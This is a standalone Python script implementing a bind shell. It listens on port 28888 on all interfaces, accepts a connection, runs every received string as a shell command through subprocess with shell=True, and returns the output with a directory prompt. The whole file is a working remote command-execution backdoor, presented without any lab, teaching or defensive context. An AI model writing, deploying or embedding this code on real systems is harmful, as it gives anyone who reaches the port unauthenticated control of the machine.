import socket
import sys
import os
import subprocess


def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 28888
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error : ' + str(msg))


def bind_socket():
    try:
        global host
        global port
        global s
        s.bind((host, port))
        s.listen(5)
        print('Binding to the port 28888')
    except socket.error as msg:
        print('Socket binding error : ' + str(msg) + " Retrying......")
        bind_socket()


def accept_connection():
    conn, address = s.accept()
    print('Connection has been established with '+str(address[0]+ 'on port' + str(address[1])))
    execute_cmd(conn)
    conn.close()
    s.close()
    sys.exit()


def execute_cmd(conn):
    while True:
        data = conn.recv(1024)
        data_str = str(data, 'utf-8')
        if data_str[:2] == 'cd':
            os.chdir(data_str[3:])
        if len(data) > 0:
            cmd = subprocess.Popen(data_str, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_string = str(output_byte, 'utf-8')
            current_dir = os.getcwd() + " > "
            conn.send(str.encode(output_string + current_dir))


def main():
    create_socket()
    bind_socket()
    accept_connection()


main()